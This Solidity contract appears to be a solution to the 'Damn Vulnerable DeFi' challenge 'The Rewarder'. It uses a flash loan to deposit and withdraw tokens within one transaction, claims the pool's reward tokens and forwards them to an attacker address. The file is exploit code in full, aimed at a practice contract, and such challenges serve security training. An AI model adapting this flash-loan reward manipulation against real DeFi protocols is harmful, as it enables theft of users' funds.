pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract TheRewarderExploit {
    TheRewarderPool rewardPool;
    address caller;

    function exploit(FlashLoanerPool flashLoan, TheRewarderPool _rewardPool, uint256 amount, address to) external {
        caller = to;
        rewardPool = _rewardPool;
        flashLoan.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        DamnValuableToken dvt = rewardPool.liquidityToken();

        // Approve DVT for use in the reward pool
        dvt.approve(address(rewardPool), amount);

        // Deposit DVT into reward pool and receive reward tokens 
        rewardPool.deposit(amount);

        // Withdraw DVT from reward pool
        rewardPool.withdraw(amount);

        // Repay flash loan
        require(dvt.transfer(msg.sender, amount), "dvt transfer");

        RewardToken rt = rewardPool.rewardToken();

        // Send reward tokens to the attacker
        require(rt.transfer(caller, rt.balanceOf(address(this))), "reward transfer");
    }
}